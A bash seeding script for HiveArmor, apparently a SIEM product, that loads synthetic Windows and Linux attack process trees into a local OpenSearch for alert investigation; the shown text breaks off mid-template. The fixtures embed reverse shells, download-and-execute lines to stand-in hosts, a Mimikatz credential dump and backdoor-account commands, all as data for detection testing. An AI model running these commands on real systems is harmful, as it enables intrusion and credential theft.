#!/usr/bin/env bash
# =============================================================================
# HiveArmor — Seed telemetry data for investigation-ready alerts
# =============================================================================
# Seeds realistic process trees, network flows, IOC indicators, and related
# alert chains for the 50 investigation-ready alerts created by Sprint 39's
# seed-investigation-alerts.sh.
#
# Data targets:
#   - Process events  → v3-hive-log-* (event.category: process)
#   - Network events  → v3-hive-log-* (event.category: network)
#   - IOC indicators  → v3-hive-log-* (threat.indicator.* enrichment)
#   - Related alerts  → v3-hive-alert-* (correlated by entity/session/rule)
#
# Alerts are matched by ID pattern: INV-* (from Sprint 39 seed)
#
# Usage:
#   cd local-dev && bash seed-telemetry-data.sh
#
# Prerequisites:
#   - OpenSearch running on https://localhost:9200
#   - Backend API running on http://localhost:8088 (for verification)
#   - Sprint 39 seed-investigation-alerts.sh already executed (INV-* alerts exist)
#   - Credentials: admin / LocalDev@2024! (OpenSearch)
#   - Credentials: admin / localdev123! (Backend API)
# =============================================================================

set -euo pipefail

# ─── Configuration ───────────────────────────────────────────────────────────

# OpenSearch direct access (for indexing)
OS_URL="https://localhost:9200"
OS_USER="admin"
OS_PASS='LocalDev@2024!'
CURL_OS="curl -sk -u ${OS_USER}:${OS_PASS}"

# Backend API (for verification)
BACKEND_URL="http://localhost:8088"
BACKEND_API="${BACKEND_URL}/api"

# Common curl defaults
CONTENT_TYPE="Content-Type: application/json"
CONTENT_TYPE_NDJSON="Content-Type: application/x-ndjson"

# Date helpers
TODAY=$(date -u +%Y.%m.%d)
NOW_EPOCH=$(date -u +%s)
INGEST_TS=$(date -u +%Y-%m-%dT%H:%M:%S.000Z)

# ─── Color Output Helpers ────────────────────────────────────────────────────

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No color

info()    { echo -e "${CYAN}[INFO]${NC} $*"; }
success() { echo -e "${GREEN}[OK]${NC}   $*"; }
warn()    { echo -e "${YELLOW}[WARN]${NC} $*"; }
fail()    { echo -e "${RED}[FAIL]${NC} $*"; }

# ─── Utility Functions ───────────────────────────────────────────────────────

# Generate ISO timestamp offset by N seconds from now
gen_ts() {
  local offset=$1
  date -u -r $(( NOW_EPOCH - offset )) +%Y-%m-%dT%H:%M:%S.000Z 2>/dev/null || \
  date -u -d "@$(( NOW_EPOCH - offset ))" +%Y-%m-%dT%H:%M:%S.000Z
}

# Bulk insert helper — sends NDJSON to OpenSearch _bulk API
bulk_insert() {
  local payload="$1"
  echo "$payload" | ${CURL_OS} -X POST "${OS_URL}/_bulk" \
    -H "${CONTENT_TYPE_NDJSON}" \
    --data-binary @- 2>/dev/null | python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    items = r.get('items', [])
    errors = r.get('errors', False)
    if errors:
        err_count = sum(1 for i in items if 'error' in i.get('index', {}))
        print(f'  Indexed {len(items)} docs ({err_count} errors)')
    else:
        print(f'  Indexed {len(items)} docs')
except:
    print('  Bulk insert completed')
"
}

# Authenticate against backend API to get JWT (for verification steps)
get_backend_token() {
  local response
  response=$(curl -s --max-time 10 -X POST "${BACKEND_API}/authenticate" \
    -H "${CONTENT_TYPE}" \
    -d '{"username":"admin","password":"localdev123!","rememberMe":false}' 2>/dev/null || echo "")

  if [ -z "$response" ]; then
    warn "Backend API not reachable at ${BACKEND_URL} — skipping API verification"
    echo ""
    return
  fi

  local token
  token=$(echo "$response" | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null || echo "")

  if [ -z "$token" ]; then
    warn "Could not authenticate against backend API — skipping API verification"
    echo ""
    return
  fi

  echo "$token"
}

# ─── Banner ──────────────────────────────────────────────────────────────────

echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${CYAN}  HiveArmor — Seed Telemetry Data for Investigation Alerts${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "  Process trees, network flows, IOC indicators, and related alert chains"
echo -e "  Target: INV-* alerts in v3-hive-log-* and v3-hive-alert-* indices"
echo ""

# ─── Process Tree Templates ──────────────────────────────────────────────────
# Windows process hierarchy templates (Task 1.2)
# Each template defines a realistic process ancestry chain with:
#   - process name at each level
#   - realistic command line
#   - code signature info (exists, subject_name, trusted)
#   - executable path
# These are consumed by the Python NDJSON generator during event creation.

# Template 1: explorer.exe → cmd.exe → powershell.exe → rundll32.exe (4 levels)
read -r -d '' WIN_PROC_TREE_1 << 'EOF' || true
{
  "id": "explorer-cmd-ps-rundll32",
  "os": "windows",
  "description": "User shell spawns cmd which launches encoded PowerShell dropping to rundll32",
  "levels": [
    {
      "process_name": "explorer.exe",
      "command_line": "C:\\Windows\\explorer.exe",
      "executable": "C:\\Windows\\explorer.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "cmd.exe",
      "command_line": "cmd.exe /c \"echo %COMSPEC% && start /b powershell.exe -w hidden -ep bypass\"",
      "executable": "C:\\Windows\\System32\\cmd.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "powershell.exe",
      "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "rundll32.exe",
      "command_line": "rundll32.exe C:\\Users\\Public\\Documents\\payload.dll,DllRegisterServer",
      "executable": "C:\\Windows\\System32\\rundll32.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    }
  ]
}
EOF

# Template 2: explorer.exe → outlook.exe → WINWORD.EXE → powershell.exe → certutil.exe (5 levels)
read -r -d '' WIN_PROC_TREE_2 << 'EOF' || true
{
  "id": "explorer-outlook-word-ps-certutil",
  "os": "windows",
  "description": "Email client opens malicious Word doc that spawns PowerShell downloading payload via certutil",
  "levels": [
    {
      "process_name": "explorer.exe",
      "command_line": "C:\\Windows\\explorer.exe",
      "executable": "C:\\Windows\\explorer.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "outlook.exe",
      "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
      "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
      "code_signature": { "exists": true, "subject_name": "Microsoft Corporation", "trusted": true }
    },
    {
      "process_name": "WINWORD.EXE",
      "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\sarah.chen\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\ABCD1234\\invoice-Q3-2024.docm\"",
      "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
      "code_signature": { "exists": true, "subject_name": "Microsoft Corporation", "trusted": true }
    },
    {
      "process_name": "powershell.exe",
      "command_line": "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.22/stager.ps1')\"",
      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "certutil.exe",
      "command_line": "certutil.exe -urlcache -split -f http://198.51.100.22/payload.exe C:\\Users\\Public\\svchost.exe",
      "executable": "C:\\Windows\\System32\\certutil.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    }
  ]
}
EOF

# Template 3: svchost.exe → wmiprvse.exe → cmd.exe → net.exe (4 levels)
read -r -d '' WIN_PROC_TREE_3 << 'EOF' || true
{
  "id": "svchost-wmi-cmd-net",
  "os": "windows",
  "description": "WMI provider host spawns command shell for reconnaissance via net commands",
  "levels": [
    {
      "process_name": "svchost.exe",
      "command_line": "C:\\Windows\\System32\\svchost.exe -k DcomLaunch -p",
      "executable": "C:\\Windows\\System32\\svchost.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "wmiprvse.exe",
      "command_line": "C:\\Windows\\System32\\wbem\\wmiprvse.exe -secured -Embedding",
      "executable": "C:\\Windows\\System32\\wbem\\wmiprvse.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "cmd.exe",
      "command_line": "cmd.exe /Q /c \"net user admin P@ss123 /add && net localgroup administrators admin /add\"",
      "executable": "C:\\Windows\\System32\\cmd.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "net.exe",
      "command_line": "net user admin P@ss123 /add",
      "executable": "C:\\Windows\\System32\\net.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    }
  ]
}
EOF

# Template 4: winlogon.exe → userinit.exe → explorer.exe → mshta.exe → powershell.exe → beacon.exe (6 levels)
read -r -d '' WIN_PROC_TREE_4 << 'EOF' || true
{
  "id": "winlogon-userinit-explorer-mshta-ps-beacon",
  "os": "windows",
  "description": "Login chain leads to mshta executing HTA payload spawning PowerShell Cobalt Strike beacon",
  "levels": [
    {
      "process_name": "winlogon.exe",
      "command_line": "winlogon.exe",
      "executable": "C:\\Windows\\System32\\winlogon.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "userinit.exe",
      "command_line": "C:\\Windows\\System32\\userinit.exe",
      "executable": "C:\\Windows\\System32\\userinit.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "explorer.exe",
      "command_line": "C:\\Windows\\explorer.exe",
      "executable": "C:\\Windows\\explorer.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "mshta.exe",
      "command_line": "mshta.exe http://203.0.113.45/update.hta",
      "executable": "C:\\Windows\\System32\\mshta.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "powershell.exe",
      "command_line": "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgA",
      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "beacon.exe",
      "command_line": "C:\\Users\\james.wilson\\AppData\\Local\\Temp\\beacon.exe -pipe \\\\\\\\pipe\\\\msagent_ea",
      "executable": "C:\\Users\\james.wilson\\AppData\\Local\\Temp\\beacon.exe",
      "code_signature": { "exists": false, "subject_name": null, "trusted": false }
    }
  ]
}
EOF

# Template 5: services.exe → svchost.exe → taskeng.exe → wscript.exe → cmd.exe (5 levels)
read -r -d '' WIN_PROC_TREE_5 << 'EOF' || true
{
  "id": "services-svchost-taskeng-wscript-cmd",
  "os": "windows",
  "description": "Scheduled task runs VBScript dropper that launches command shell for lateral movement",
  "levels": [
    {
      "process_name": "services.exe",
      "command_line": "C:\\Windows\\System32\\services.exe",
      "executable": "C:\\Windows\\System32\\services.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "svchost.exe",
      "command_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
      "executable": "C:\\Windows\\System32\\svchost.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "taskeng.exe",
      "command_line": "taskeng.exe {B7A3C4D2-1F8E-4A5B-9C6D-E7F8A9B0C1D2} S-1-5-18:NT AUTHORITY\\System:Service:",
      "executable": "C:\\Windows\\System32\\taskeng.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "wscript.exe",
      "command_line": "wscript.exe //B //Nologo \"C:\\Windows\\Temp\\updater.vbs\"",
      "executable": "C:\\Windows\\System32\\wscript.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "cmd.exe",
      "command_line": "cmd.exe /c \"copy \\\\\\\\10.2.8.12\\\\c$\\\\windows\\\\temp\\\\stage.exe %TEMP%\\\\svc.exe && %TEMP%\\\\svc.exe\"",
      "executable": "C:\\Windows\\System32\\cmd.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    }
  ]
}
EOF

# Template 6: lsass.exe → rundll32.exe → mimikatz.exe (3 levels)
read -r -d '' WIN_PROC_TREE_6 << 'EOF' || true
{
  "id": "lsass-rundll32-mimikatz",
  "os": "windows",
  "description": "LSASS process access leads to rundll32 loading credential dumper (Mimikatz)",
  "levels": [
    {
      "process_name": "lsass.exe",
      "command_line": "C:\\Windows\\System32\\lsass.exe",
      "executable": "C:\\Windows\\System32\\lsass.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "rundll32.exe",
      "command_line": "rundll32.exe C:\\Windows\\Temp\\cred.dll,MiniDump",
      "executable": "C:\\Windows\\System32\\rundll32.exe",
      "code_signature": { "exists": true, "subject_name": "Microsoft Windows", "trusted": true }
    },
    {
      "process_name": "mimikatz.exe",
      "command_line": "C:\\Windows\\Temp\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
      "executable": "C:\\Windows\\Temp\\mimikatz.exe",
      "code_signature": { "exists": false, "subject_name": null, "trusted": false }
    }
  ]
}
EOF

# Windows process tree template registry (for iteration in event generation)
WIN_PROC_TREES=(
  "WIN_PROC_TREE_1"
  "WIN_PROC_TREE_2"
  "WIN_PROC_TREE_3"
  "WIN_PROC_TREE_4"
  "WIN_PROC_TREE_5"
  "WIN_PROC_TREE_6"
)

WIN_PROC_TREE_COUNT=${#WIN_PROC_TREES[@]}
info "Loaded ${WIN_PROC_TREE_COUNT} Windows process tree templates"

# Linux process hierarchy templates (Task 1.3)
# Each template defines a realistic Linux process ancestry chain with:
#   - process name at each level
#   - realistic command line
#   - code signature info (exists, subject_name, trusted)
#   - executable path

# Template 1: systemd→sshd→bash→python3→/tmp/.cache/beacon (5 levels)
read -r -d '' LINUX_PROC_TREE_1 << 'EOF' || true
{
  "id": "systemd-sshd-bash-python3-beacon",
  "os": "linux",
  "description": "SSH session spawns bash which runs Python dropper launching a C2 beacon from tmp cache",
  "levels": [
    {
      "process_name": "systemd",
      "command_line": "/sbin/init",
      "executable": "/usr/lib/systemd/systemd",
      "code_signature": { "exists": true, "subject_name": "Red Hat", "trusted": true }
    },
    {
      "process_name": "sshd",
      "command_line": "/usr/sbin/sshd -D -oCiphers=aes256-gcm@openssh.com",
      "executable": "/usr/sbin/sshd",
      "code_signature": { "exists": true, "subject_name": "Red Hat", "trusted": true }
    },
    {
      "process_name": "bash",
      "command_line": "-bash",
      "executable": "/usr/bin/bash",
      "code_signature": { "exists": true, "subject_name": "Red Hat", "trusted": true }
    },
    {
      "process_name": "python3",
      "command_line": "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('203.0.113.45',4444));os.dup2(s.fileno(),0);subprocess.call(['/bin/sh','-i'])\"",
      "executable": "/usr/bin/python3",
      "code_signature": { "exists": true, "subject_name": "Red Hat", "trusted": true }
    },
    {
      "process_name": "beacon",
      "command_line": "/tmp/.cache/beacon --interval 30 --jitter 15 --server 203.0.113.45",
      "executable": "/tmp/.cache/beacon",
      "code_signature": { "exists": false, "subject_name": null, "trusted": false }
    }
  ]
}
EOF

# Template 2: systemd→cron→sh→curl→/dev/shm/.hidden (5 levels)
read -r -d '' LINUX_PROC_TREE_2 << 'EOF' || true
{
  "id": "systemd-cron-sh-curl-hidden",
  "os": "linux",
  "description": "Cron job executes shell script that downloads and runs a hidden implant from shared memory",
  "levels": [
    {
      "process_name": "systemd",
      "command_line": "/sbin/init",
      "executable": "/usr/lib/systemd/systemd",
      "code_signature": { "exists": true, "subject_name": "Red Hat", "trusted": true }
    },
    {
      "process_name": "cron",
      "command_line": "/usr/sbin/cron -f -P",
      "executable": "/usr/sbin/cron",
      "code_signature": { "exists": true, "subject_name": "Red Hat", "trusted": true }
    },
    {
      "process_name": "sh",
      "command_line": "/bin/sh -c /var/spool/cron/crontabs/root",
      "executable": "/bin/sh",
      "code_signature": { "exists": true, "subject_name": "Red Hat", "trusted": true }
    },
    {
      "process_name": "curl",
      "command_line": "curl -s -o /dev/shm/.hidden http://198.51.100.22/loader.bin",
      "executable": "/usr/bin/curl",
      "code_signature": { "exists": true, "subject_name": "Red Hat", "trusted": true }
    },
    {
      "process_name": ".hidden",
      "command_line": "/dev/shm/.hidden --daemon --c2 198.51.100.22:8443",
      "executable": "/dev/shm/.hidden",
      "code_signature": { "exists": false, "subject_name": null, "trusted": false }
    }
  ]
}
EOF

# Template 3: init→apache2→sh→wget→chmod→./exploit (6 levels)
read -r -d '' LINUX_PROC_TREE_3 << 'EOF' || true
{
  "id": "init-apache2-sh-wget-chmod-exploit",
  "os": "linux",
  "description": "Web server compromise via command injection downloads exploit payload and executes with elevated permissions",
  "levels": [
    {
      "process_name": "init",
      "command_line": "/sbin/init",
      "executable": "/sbin/init",
      "code_signature": { "exists": true, "subject_name": "Red Hat", "trusted": true }
    },
    {
      "process_name": "apache2",
      "command_line": "/usr/sbin/apache2 -k start",
      "executable": "/usr/sbin/apache2",
      "code_signature": { "exists": true, "subject_name": "Red Hat", "trusted": true }
    },
    {
      "process_name": "sh",
      "command_line": "sh -c \"wget http://203.0.113.88/exploit.elf -O /tmp/exploit && chmod +x /tmp/exploit && /tmp/exploit\"",
      "executable": "/bin/sh",
      "code_signature": { "exists": true, "subject_name": "Red Hat", "trusted": true }
    },
    {
      "process_name": "wget",
      "command_line": "wget http://203.0.113.88/exploit.elf -O /tmp/exploit",
      "executable": "/usr/bin/wget",
      "code_signature": { "exists": true, "subject_name": "Red Hat", "trusted": true }
    },
    {
      "process_name": "chmod",
      "command_line": "chmod +x /tmp/exploit",
      "executable": "/usr/bin/chmod",
      "code_signature": { "exists": true, "subject_name": "Red Hat", "trusted": true }
    },
    {
      "process_name": "exploit",
      "command_line": "/tmp/exploit --escalate --callback 203.0.113.88:9001",
      "executable": "/tmp/exploit",
      "code_signature": { "exists": false, "subject_name": null, "trusted": false }
    }
  ]
}
EOF

# Template 4: systemd→dockerd→containerd→bash→nc (5 levels)
read -r -d '' LINUX_PROC_TREE_4 << 'EOF' || true
{
  "id": "systemd-dockerd-containerd-bash-nc",
  "os": "linux",
  "description": "Container escape via Docker daemon leads to reverse shell using netcat",
  "levels": [
    {
      "process_name": "systemd",
      "command_line": "/sbin/init",
      "executable": "/usr/lib/systemd/systemd",
      "code_signature": { "exists": true, "subject_name": "Red Hat", "trusted": true }
    },
    {
      "process_name": "dockerd",
      "command_line": "/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock",
      "executable": "/usr/bin/dockerd",
      "code_signature": { "exists": true, "subject_name": "Red Hat", "trusted": true }
    },
    {
      "process_name": "containerd",
      "command_line": "/usr/bin/containerd",
      "executable": "/usr/bin/containerd",
      "code_signature": { "exists": true, "subject_name": "Red Hat", "trusted": true }
    },
    {
      "process_name": "bash",
      "command_line": "bash -c \"cat /proc/1/environ && nsenter -t 1 -m -u -i -n -p -- /bin/bash\"",
      "executable": "/usr/bin/bash",
      "code_signature": { "exists": true, "subject_name": "Red Hat", "trusted": true }
    },
    {
      "process_name": "nc",
      "command_line": "nc -e /bin/bash 198.51.100.177 4443",
      "executable": "/usr/bin/nc",
      "code_signature": { "exists": true, "subject_name": "Red Hat", "trusted": true }
    }
  ]
}
EOF

# Linux process tree template registry (for iteration in event generation)
LINUX_PROC_TREES=(
  "LINUX_PROC_TREE_1"
  "LINUX_PROC_TREE_2"
  "LINUX_PROC_TREE_3"
  "LINUX_PROC_TREE_4"
)

LINUX_PROC_TREE_COUNT=${#LINUX_PROC_TREES[@]}
info "Loaded ${LINUX_PROC_TREE_COUNT} Linux process tree templates"

# ─── Process Event Generation (Tasks 1.4-1.10) ──────────────────────────────
# Queries existing INV-* alerts, generates 4-12 process events per alert
# with proper ECS fields, sequential timestamps, realistic PIDs, and
# process.code_signature fields. Links via alert.id and correlation.id.

info "Generating process tree events for investigation alerts..."

PROC_NDJSON_FILE=$(mktemp /tmp/ha_proc_events_XXXXXX)

python3 << 'PYEOF' > "$PROC_NDJSON_FILE"
import json, random, subprocess, sys
from datetime import datetime, timedelta, timezone

random.seed(2024)  # Reproducible process tree seed data

NOW = datetime.now(timezone.utc)
TODAY_STR = NOW.strftime("%Y.%m.%d")

# ─── Windows process tree templates (matching shell heredocs above) ──────────
WIN_TEMPLATES = [
    {
        "id": "explorer-cmd-ps-rundll32", "os": "windows",
        "levels": [
            {"process_name": "explorer.exe", "command_line": "C:\\Windows\\explorer.exe", "executable": "C:\\Windows\\explorer.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "cmd.exe", "command_line": "cmd.exe /c \"echo %COMSPEC% && start /b powershell.exe -w hidden -ep bypass\"", "executable": "C:\\Windows\\System32\\cmd.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "powershell.exe", "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "rundll32.exe", "command_line": "rundll32.exe C:\\Users\\Public\\Documents\\payload.dll,DllRegisterServer", "executable": "C:\\Windows\\System32\\rundll32.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}}
        ]
    },
    {
        "id": "explorer-outlook-word-ps-certutil", "os": "windows",
        "levels": [
            {"process_name": "explorer.exe", "command_line": "C:\\Windows\\explorer.exe", "executable": "C:\\Windows\\explorer.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "outlook.exe", "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"", "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "code_signature": {"exists": True, "subject_name": "Microsoft Corporation", "trusted": True}},
            {"process_name": "WINWORD.EXE", "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\sarah.chen\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\ABCD1234\\invoice-Q3-2024.docm\"", "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "code_signature": {"exists": True, "subject_name": "Microsoft Corporation", "trusted": True}},
            {"process_name": "powershell.exe", "command_line": "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.22/stager.ps1')\"", "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "certutil.exe", "command_line": "certutil.exe -urlcache -split -f http://198.51.100.22/payload.exe C:\\Users\\Public\\svchost.exe", "executable": "C:\\Windows\\System32\\certutil.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}}
        ]
    },
    {
        "id": "svchost-wmi-cmd-net", "os": "windows",
        "levels": [
            {"process_name": "svchost.exe", "command_line": "C:\\Windows\\System32\\svchost.exe -k DcomLaunch -p", "executable": "C:\\Windows\\System32\\svchost.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "wmiprvse.exe", "command_line": "C:\\Windows\\System32\\wbem\\wmiprvse.exe -secured -Embedding", "executable": "C:\\Windows\\System32\\wbem\\wmiprvse.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "cmd.exe", "command_line": "cmd.exe /Q /c \"net user admin P@ss123 /add && net localgroup administrators admin /add\"", "executable": "C:\\Windows\\System32\\cmd.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "net.exe", "command_line": "net user admin P@ss123 /add", "executable": "C:\\Windows\\System32\\net.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}}
        ]
    },
    {
        "id": "winlogon-userinit-explorer-mshta-ps-beacon", "os": "windows",
        "levels": [
            {"process_name": "winlogon.exe", "command_line": "winlogon.exe", "executable": "C:\\Windows\\System32\\winlogon.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "userinit.exe", "command_line": "C:\\Windows\\System32\\userinit.exe", "executable": "C:\\Windows\\System32\\userinit.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "explorer.exe", "command_line": "C:\\Windows\\explorer.exe", "executable": "C:\\Windows\\explorer.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "mshta.exe", "command_line": "mshta.exe http://203.0.113.45/update.hta", "executable": "C:\\Windows\\System32\\mshta.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "powershell.exe", "command_line": "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgA", "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "beacon.exe", "command_line": "C:\\Users\\james.wilson\\AppData\\Local\\Temp\\beacon.exe -pipe \\\\\\\\.\\\\pipe\\\\msagent_ea", "executable": "C:\\Users\\james.wilson\\AppData\\Local\\Temp\\beacon.exe", "code_signature": {"exists": False, "subject_name": None, "trusted": False}}
        ]
    },
    {
        "id": "services-svchost-taskeng-wscript-cmd", "os": "windows",
        "levels": [
            {"process_name": "services.exe", "command_line": "C:\\Windows\\System32\\services.exe", "executable": "C:\\Windows\\System32\\services.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "svchost.exe", "command_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule", "executable": "C:\\Windows\\System32\\svchost.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "taskeng.exe", "command_line": "taskeng.exe {B7A3C4D2-1F8E-4A5B-9C6D-E7F8A9B0C1D2}", "executable": "C:\\Windows\\System32\\taskeng.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "wscript.exe", "command_line": "wscript.exe //B //Nologo \"C:\\Windows\\Temp\\updater.vbs\"", "executable": "C:\\Windows\\System32\\wscript.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "cmd.exe", "command_line": "cmd.exe /c \"copy \\\\10.2.8.12\\c$\\windows\\temp\\stage.exe %TEMP%\\svc.exe && %TEMP%\\svc.exe\"", "executable": "C:\\Windows\\System32\\cmd.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}}
        ]
    },
    {
        "id": "lsass-rundll32-mimikatz", "os": "windows",
        "levels": [
            {"process_name": "lsass.exe", "command_line": "C:\\Windows\\System32\\lsass.exe", "executable": "C:\\Windows\\System32\\lsass.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "rundll32.exe", "command_line": "rundll32.exe C:\\Windows\\Temp\\cred.dll,MiniDump", "executable": "C:\\Windows\\System32\\rundll32.exe", "code_signature": {"exists": True, "subject_name": "Microsoft Windows", "trusted": True}},
            {"process_name": "mimikatz.exe", "command_line": "C:\\Windows\\Temp\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", "executable": "C:\\Windows\\Temp\\mimikatz.exe", "code_signature": {"exists": False, "subject_name": None, "trusted": False}}
        ]
    }
]

# ─── Linux process tree templates (Task 1.3) ─────────────────────────────────
LINUX_TEMPLATES = [
    {
        "id": "systemd-sshd-bash-python3-beacon", "os": "linux",
        "levels": [
            {"process_name": "systemd", "command_line": "/sbin/init", "executable": "/usr/lib/systemd/systemd", "code_signature": {"exists": True, "subject_name": "Red Hat", "trusted": True}},
            {"process_name": "sshd", "command_line": "/usr/sbin/sshd -D -oCiphers=aes256-gcm@openssh.com", "executable": "/usr/sbin/sshd", "code_signature": {"exists": True, "subject_name": "Red Hat", "trusted": True}},
            {"process_name": "bash", "command_line": "-bash", "executable": "/usr/bin/bash", "code_signature": {"exists": True, "subject_name": "Red Hat", "trusted": True}},
            {"process_name": "python3", "command_line": "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('203.0.113.45',4444));os.dup2(s.fileno(),0);subprocess.call(['/bin/sh','-i'])\"", "executable": "/usr/bin/python3", "code_signature": {"exists": True, "subject_name": "Red Hat", "trusted": True}},
